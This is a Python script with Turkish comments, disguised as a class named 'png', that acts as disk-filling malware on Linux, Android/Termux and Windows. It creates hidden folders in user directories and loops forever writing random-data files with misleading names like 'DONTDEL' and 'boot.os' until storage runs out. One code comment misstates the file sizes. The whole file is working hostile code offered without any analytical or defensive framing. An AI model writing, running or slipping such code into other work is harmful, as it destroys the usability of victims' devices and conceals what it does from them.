import os,platform,sys,random,threading,time

class png():
    def __init__(self):
        self.filenames = ["config","DONTDEL","boot.os","boot.fi"]
        self.linux_locale = [f"/home/{os.getlogin()}/.linux/"]
        self.linux_aarch64_locale = ["/sdcard/Android/.Android/"]
        self.windows_locale = [f"C:\\Users\\{os.getlogin()}\\AppData\\Windows\\"]
        self.undefinied = ["/home/.system/"]

        self.platform()

        

    def platform(self):
        system = platform.system()
        if system == "Linux":
            if platform.machine() == "aarch64": # Termuxcu arkadaşlara deneyimleme şansı
                try:
                    os.listdir("/sdcard") # sdcard'a erişimimiz var mı diye bakıyoruz
                except:
                    os.system("termux-setup-storage")
                    sys.exit("\033[31mWe need access storage file !\033[0m")
                else:
                    self.dosyala(self.linux_aarch64_locale)
            
            else:
                #print("Test")
                self.dosyala(self.linux_locale)

        elif system == "Windows":
            self.dosyala(self.windows_locale)
    
    
    def dosyala(self,__konum__):
        while 1:
            
            konum = random.choice(__konum__)

            if not os.path.exists(konum):
                os.makedirs(konum)
                
            
            os.chdir(konum)

            try:
                eleman = random.choice(self.filenames)
                orj = eleman
                while 1:
                    if os.path.exists(eleman):
                        eleman = orj + str(random.randint(1,999999))
                    else:
                        break
                
                with open(eleman,"wb") as yaz:
                    yaz.write(os.urandom(512**random.randint(1,3)) ) # 3 = 1gb | 4 = kim bilir :D
            except Exception as hata:
                print(hata)



png()
